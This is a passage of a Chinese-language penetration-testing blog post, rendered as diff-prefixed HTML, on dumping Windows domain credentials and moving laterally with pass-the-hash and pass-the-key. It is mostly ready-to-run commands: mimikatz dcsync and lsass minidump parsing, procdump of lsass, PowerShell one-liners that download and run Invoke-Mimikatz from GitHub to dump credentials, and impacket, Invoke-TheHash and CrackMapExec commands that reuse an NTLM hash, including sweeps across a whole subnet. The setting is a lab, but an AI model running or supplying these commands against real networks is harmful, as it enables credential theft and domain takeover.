+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">lsadump::dcsync /domain:test.local /all /csv
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="cobalt-strike">Cobalt Strike</h3>
+<p>这块没有测试的环境就不再展开，相信熟悉cs的小伙伴也知道这个功能,具体功能在：</p>
+<p><code>选中客户端列表-&gt;右键选择Access的模块中的Dump Hashes</code></p>
+<p>读取到的凭证可以在菜单栏的<code>view-Credentials</code>中查看。</p>
+<ul>
+<li>
+<p>导出域内的所有hash可以使用Beacon的hashdump。</p>
+</li>
+<li>
+<p>导出域内的所有hash可以使用Beacon的dcsync</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">查询域内所有hash
+dcsync [DOMAIN.FQDN]
+查询指定用户hash
+dcsync [DOMAIN.FQDN] [DOMAIN\user]
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="invoke-mimikatzps1">Invoke-Mimikatz.ps1</h3>
+<p>这个是mimikatz的powershell版本，也经常用于在内网渗透中，相对于exe的版本会方便许多。</p>
+<p>该脚本集成在<a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>项目中，下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz.ps1</a></p>
+<p>这个工具在另外一篇文章有写过具体的用法<a href="https://xxe.icu/posts/powershell-attack/#invoke-mimikatz">Powershell在渗透测试中的利用</a></p>
+<ul>
+<li>
+<p>无文件读取方式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCreds&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>读取sam数据库</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -Command \&#34;</span><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="n">token</span><span class="p">::</span><span class="n">elevate</span>  <span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span> <span class="n">exit</span><span class="p">\</span><span class="s2">&#34;&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<p>在这里插一点内容，主要是获取域用户的hash值，也可以使用<a href="https://github.com/EmpireProject/Empire">Empire</a>的<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1">Invoke-DCSync.ps1</a>工具来获取：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">导出域内所有用户的hash
+Invoke-DCSync -DumpForest | ft -wrap -autosize
+导出指定账户的hash
+Invoke-DCSync -DumpForest -Users @(&#34;administrator&#34;) | ft -wrap -autosize
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="crackmapexec">CrackMapExec</h3>
+<p>该工具也可以导出hash，而且还是批量的，具体在官方gitbook上写得很明细了，这里不再展开，后续会专门写一遍关于该工具的文章。</p>
+<p>安装方法：</p>
+<p><a href="https://mpgn.gitbook.io/crackmapexec/getting-started/installation">https://mpgn.gitbook.io/crackmapexec/getting-started/installation</a></p>
+<p>导出凭证（需要有管理员权限）：</p>
+<p><a href="https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials">https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials</a></p>
+<h3 id="转储lsass进程">转储lsass进程</h3>
+<p>因为我们的凭证除了报错在sam文件中，还可以在lsass进程保存，现在找到lsass进程,然后创建转储文件：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/5.png" alt="5"></p>
+<p>一般会保存在<code>C:\Users\用户名\AppData\Local\Temp\lsass.DMP</code></p>
+<p>将该文件下载回来放置在Mimikatz的同目录下，然后执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">sekurlsa::minidump lsass.DMP
+sekurlsa::logonPasswords full
+</code></pre></td></tr></table>
+</div>
+</div><p>当然我们也可以使用<code>procdump</code>这个程序来导出lsass.dmp，只需在命令行获取system权限操作即可。</p>
+<p>该工具是微软官方的一款工具：<a href="https://download.sysinternals.com/files/Procdump.zip"><strong>Download ProcDump</strong></a></p>
+<p>执行以下命令即可导出lass.dmp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">32位机器：procdump.exe -accepteula -ma lsass.exe lsass.dmp 
+64位机器：procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="pass-the-hash">Pass The Hash</h2>
+<p>如果内网主机的本地管理员账户密码相同，那么可以通过pass the hash远程登录到任意一台主机，操作简单、威力无穷。</p>
+<p>下面会使用几种方法来进行攻击，用到的工具有Smbmap、CrackMapExec、Smbexec等。</p>
+<p>比如我们现在的环境是：</p>
+<p>DC：172.16.0.106(域管用户testuser)</p>
+<p>Win7：172.16.0.105(从这台获取到了hash)</p>
+<p>kali：172.16.0.107</p>
+<p>域：hack.lab</p>
+<p>testuser的hash：de26cce0356891a4a020e7c4957afc72</p>
+<h3 id="smbmap">Smbmap</h3>
+<p>SMBMAP允许用户在整个域中枚举Samba共享驱动器。列出共享驱动器，驱动程序权限，共享内容，上载/下载功能，文件名自动下载模式匹配，甚至执行远程命令。</p>
+<p>下载：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/ShawnDEvans/smbmap
+<span class="nb">cd</span> smbmap
+</code></pre></td></tr></table>
+</div>
+</div><p>安装一下模块：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 -m pip install -r requirements.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>这款工具kali也有内置，我们可以直接使用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">smbmap -u testuser -p &#39;aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72&#39; -H 172.16.0.106 -d hack.lab -x &#39;whoami&#39;
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>aad3b435b51404eeaad3b435b51404ee上我们讲过是LM hash默认的值</p>
+</blockquote>
+<p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/6.png" alt="6"></p>
+<h3 id="smbexecpy">smbexec.py</h3>
+<p>smbexec.py是<a href="https://github.com/SecureAuthCorp/impacket">impacket</a>里面的一个工具，在kali是已经预装好的，如果没有安装可以用以下命令进行安装：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 -m pip install impacket
+</code></pre></td></tr></table>
+</div>
+</div><p>发起pth攻击命令如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">smbexec.py hack.lab/testuser@172.16.0.106 -hashes <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>结果如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/8.png" alt="8"></p>
+<h3 id="invoke-smbexec">Invoke-SMBExec</h3>
+<p>当然，除了有python版本也有powershell的版本，在<a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a>项目中有个脚本文件<code>Invoke-SMBExec.ps1</code>,大家可以直接在上面进行下载</p>
+<p>下载链接：<a href="https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1">Invoke-SMBExec.ps1</a></p>
+<p>执行命令如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Modle</span> <span class="p">.\</span><span class="nb">Invoke-SMBExec</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Invoke-SMBExec</span> <span class="n">-Target</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">106</span> <span class="n">-Domain</span> <span class="n">hack</span><span class="p">.</span><span class="n">lab</span> <span class="n">-Username</span> <span class="n">testuser</span> <span class="n">-Hash</span> <span class="n">de26cce0356891a4a020e7c4957afc72</span> <span class="n">-Command</span> <span class="s2">&#34;calc.exe&#34;</span> <span class="n">-verbose</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>结果如下：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/9.png" alt="9"></p>
+<p>因为这款工具执行命令不会返回结果，可以使用cs或者msf的powershell命令进行远程上线，上面的命令执行后会在目标主机生成一个当前权限的计算器：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/10.png" alt="10"></p>
+<h3 id="invoke-wmiexec">Invoke-WMIExec</h3>
+<p>同样是在在<a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a>项目的一个脚本，叫做<code>Invoke-WMIExec.ps1</code>。</p>
+<p>用法跟上面是一致的，只是利用的方式不相同而已：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Modle</span> <span class="p">.\</span><span class="nb">Invoke-WMIExec</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Invoke-WMIExec</span> <span class="n">-Target</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">106</span> <span class="n">-Domain</span> <span class="n">hack</span><span class="p">.</span><span class="n">lab</span> <span class="n">-Username</span> <span class="n">testuser</span> <span class="n">-Hash</span> <span class="n">de26cce0356891a4a020e7c4957afc72</span> <span class="n">-Command</span> <span class="s2">&#34;calc.exe&#34;</span> <span class="n">-verbose</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="wmiexec">wmiexec</h3>
+<p>当然还有它的python版本，也是在是<a href="https://github.com/SecureAuthCorp/impacket">impacket</a>里面的一个工具，在kali是已经预装好的，用法跟smbexec.py是一致的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">wmiexec</span><span class="p">.</span><span class="n">py</span> <span class="n">hack</span><span class="p">.</span><span class="n">lab</span><span class="p">/</span><span class="n">testuser</span><span class="nv">@172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">106</span> <span class="n">-hashes</span> <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>结果如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/11.png" alt="11"></p>
+<h3 id="atexec">Atexec</h3>
+<p>这个就是自动化实现计划任务的方式，也是在是<a href="https://github.com/SecureAuthCorp/impacket">impacket</a>里面的一个工具。</p>
+<p>使用方法如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72 hack.lab/testuser@172.16.0.106 whoami
+</code></pre></td></tr></table>
+</div>
+</div><p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/18.png" alt="18"></p>
+<h3 id="mimikatz-1">Mimikatz</h3>
+<p>又是耳熟能详的<strong>Mimikatz</strong>大杀器了，mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息。</p>
+<p>可以到GitHub下载新版的：https://github.com/gentilkiwi/mimikatz</p>
+<p>可以看到我们一开始无法连接到dc服务器查看c盘下的文件：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/12.png" alt="12"></p>
+<p>我们在主机上启动我们的mimikatz工具，执行以下命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+<span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">testuser</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">hack</span><span class="p">.</span><span class="n">lab</span> <span class="p">/</span><span class="n">ntlm</span><span class="err">:</span><span class="n">de26cce0356891a4a020e7c4957afc72</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/15.png" alt="15"></p>
+<p>就会弹出一个cmd命令窗口，这次我们再次输入就能重新列出dc上c盘的文件：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/16.png" alt="16"></p>
+<h3 id="psexec">psexec</h3>
+<p>当然也少不了我们的<strong>psexec</strong>大杀器，这是在微软官方提供的一个 PsTools 工具包里面，虽然不用做免杀，但是会在系统日志中留下记录。</p>
+<p>官方的下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">PsExec - Windows Sysinternals</a></p>
+<p>PsExec 的基本原理是：通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为”PSEXESVC“的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。由于创建或删除服务时会产生大量的日志，可以在攻击溯源时通过日志反推攻击流程。</p>
+<blockquote>
+<p>需要远程系统开启admin共享（默认是开启的），原理是基于IPC共享，目标需要开放445端口和admin在使用IPC连接目标系统后，不需要输入账户和密码。</p>
+</blockquote>
+<p>使用方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="p">\\</span><span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">105</span> <span class="n">-u</span> <span class="n">hack</span><span class="p">.</span><span class="n">lab</span><span class="p">\</span><span class="n">lucky</span> <span class="n">-p</span> <span class="n">p</span><span class="nv">@ssw0rd</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&#34;ipconfig&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>因为官方的工具只支持明文建立链接，所以我们可以使用python版本的，也是在Impacket工具包中的使用方法如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">psexec.py hack.lab/lucky@172.16.0.105 -hashes <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>结果如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/14.png" alt="14"></p>
+<h3 id="crackmapexec-1">CrackMapExec</h3>
+<p>上面在获取hash的时候也有介绍一点，现在pth也可以利用到这款工具。本节安装在kali选的是Linux，其他版本可以到GitHub上下载<a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></p>
+<p>安装：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo apt install crackmapexec
+</code></pre></td></tr></table>
+</div>
+</div><p>使用方法也很简单，执行以下命令即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">crackmapexec smb 172.16.0.106 -u testuser -H de26cce0356891a4a020e7c4957afc72 -x whoami -d hack.lab
+</code></pre></td></tr></table>
+</div>
+</div><p>如图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/7.png" alt="7"></p>
+<h2 id="pass-the-key">Pass The Key</h2>
+<p>在2014年微软终于发布了更新补丁kb2871997，禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行wmi、PSEXEC、schtasks、at和访问文件共享。</p>
+<p>但是上面的描述不是很正确的，之前也有发文说这个补丁阻止了pth,三年后还发了一篇澄清文章：<a href="https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167">Pass-the-Hash Is Dead</a></p>
+<p>关于这个补丁的详细分析可以参考问<a href="https://www.freebuf.com/articles/system/220473.html">KB22871997是否真的能防御PTH攻击？</a></p>
+<h3 id="那么什么才叫做pass-the-key呢">那么什么才叫做pass the key呢？</h3>
+<ol>
+<li>但是在<a href="https://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash">Overpass-the-hash</a>和三好学生中<a href="https://www.vuln.cn/6813">pass the hash</a>的文章中解释的是：</li>
+</ol>
+<ul>
+<li>
+<p>禁用NTLM使得psexec无法利用获得的ntlm hash进行远程连接，虽然”sekurlsa::pth”在mimikatz中被称之为”Pass The Hash”,但是其已经超越了以前的”Pass The Hash”，部分人将其命名为”Overpass-the-hash”，也就是”Pass-the-key”</p>
+</li>
+<li>
+<p>将哈希注入到 msv1_0<strong>和</strong>kerberos 提供程序中，从而可以响应 NTLM 挑战并获得 Kerberos TGT。</p>
+</li>
+</ul>
+<ol start="2">
+<li>
+<p>在<a href="https://daiker.gitbook.io/windows-protocol/kerberos/1#1.-pass-the-hash-he-pass-the-key">windows-protocol</a>和《内网安全渗透》一书中提到的是：</p>
+<p>用ntlm传递那就是pass the hash，用mimikatz的<code>sekurlsa::ekeys</code>那就称为pass the key。</p>
+</li>
+</ol>
+<p><strong>我的理解就是pass the key是用kerberos方式进行传递，pass the hash是用NTLM的方式进行传递。</strong></p>
+<p>我也在本地测试过，跟<a href="https://www.freebuf.com/articles/system/220473.html">KB22871997是否真的能防御PTH攻击？</a>文章的结果是一样的，有没有安装kb2871997补丁都是没办法使用加入管理员组的用户进行pth。</p>
+<p>在文章<a href="https://www.freebuf.com/articles/web/271048.html">内网渗透拿不到密码怎么办？试试Pass-The-Hash</a>当中有个一句描述这个问题：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">工作组环境下:
+
+Windows Vista之前的机器，可以使用本地管理员组内用户进行攻击 windows Vista之后的机器，只能是administrator用户才能进行攻击，其他用户会提示拒绝访问
+
+域环境下:
+
+域内任意一台主机的本地管理员权限和域管理员密码的NTLM hash值，可进行pth攻击
+
+由于Pass-The-Hash在win7的工作组环境下只支持在administrator用户的情况下才能利用，而windows默认是关闭这个用户的
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>所以不是因为这个补丁而导致我们用户一般情况下不能使用pth的，使用sid为500的adminisitrator确实是可以使用pth。</strong></p>
+<h3 id="使用aes-key的方式进行ptk是否要安装补丁呢">使用aes key的方式进行ptk是否要安装补丁呢？</h3>
+<p>在网上的文章中和《内网安全渗透》一书都有一个描述：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.
+</code></pre></td></tr></table>
+</div>
+</div><p>就是说如果不安装这个补丁就不能使用aes key的方式进行ptk，但是我在测试了无数次，在没有补丁的情况，还是可以使用ptk的方式进行传递的。</p>
+<p>我们使用系统命令查看是否安装了该补丁：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">systeminfo</span> <span class="p">|</span> <span class="n">findstr</span> <span class="s2">&#34;kb2871997&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>aes key的获取方式:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">privilege::debug 
+sekurlsa::ekeys
+</code></pre></td></tr></table>
+</div>
+</div><p>测试没有补丁的情况下：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/17.png" alt="17"></p>
+<p>补丁可以从这里下载<a href="http://support.microsoft.com/en-us/help/2871997">2871997</a>。</p>
+<blockquote>
+<p>注意这个补丁是安装在本地的</p>
+</blockquote>
+<p>我们在有补丁测试：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/13.png" alt="13"></p>
+<p>可以看出来好像并不是因为有这个补丁而导致aes key,看上面的文章有总结到aes key的地方：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">“受保护的用户”组支持（强制Kerberos身份验证以实施AES加密）
+1.当“域功能级别”设置为Windows Server 2012 R2时，将创建“受保护的用户”组。
+2.受保护的用户组中的帐户只能使用Kerberos协议进行身份验证，拒绝NTLM，摘要式身份验证和CredSSP。
+3.Kerberos拒绝DES和RC4加密类型进行预身份验证-必须将域配置为支持AES或更高版本。
+4.不能使用Kerberos约束或不受约束的委托来委托受保护用户的帐户。
+5.受保护的用户可以使用“身份验证策略”很好地工作。
+</code></pre></td></tr></table>
+</div>
+</div><p>所以归纳总结：<strong>Pass the key就是使用AES256或者AES128的方式进行传递。</strong></p>
+<h2 id="pth批量横向移动">pth批量横向移动</h2>
+<h3 id="crackmapexec-2">CrackMapExec</h3>
+<p>CrackMapExec集成了wmiexec、atexe、smbexec的方式,集成了smb扫描,口令爆破等功能,非常适合拿来快速移动。</p>
+<p>我们可以扫描内网中的445端口开放情况：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">crackmapexec smb 172.16.0.100/24
+</code></pre></td></tr></table>
+</div>
+</div><p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/19.png" alt="19"></p>
+<p>使用批量传递hash的命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">crackmapexec smb 172.16.0.100/24 -u testuser -H de26cce0356891a4a020e7c4957afc72 -d hack.lab
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>因为我这个是域管理账户，所以都能登录，(Pwn3d!代表用户名和hash正确)</p>
+</blockquote>
+<p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/20.png" alt="20"></p>
+<h3 id="cobalt-strike-1">Cobalt Strike</h3>
+<p>cs大家应该很熟悉了，这块我没搭环境，主要是在目标(target)当中选中目标右键选择要pth的方式即可。</p>
+<h1 id="0x03-参考">0x03 参考</h1>
+<p><a href="https://xz.aliyun.com/t/9309">https://xz.aliyun.com/t/9309</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-11631.html">http://drops.xmd5.com/static/drops/tips-11631.html</a></p>
+<p><a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
+<p><a href="https://xz.aliyun.com/t/8117">https://xz.aliyun.com/t/8117</a></p>
+<p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0</a></p>
+<p><a href="https://www.anquanke.com/post/id/193149">https://www.anquanke.com/post/id/193149</a></p>
+<p>&hellip;</p>
+
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">F0rmat</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2022-02-22
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/ad_as_reproasting/">
+            
+            <i class="iconfont">
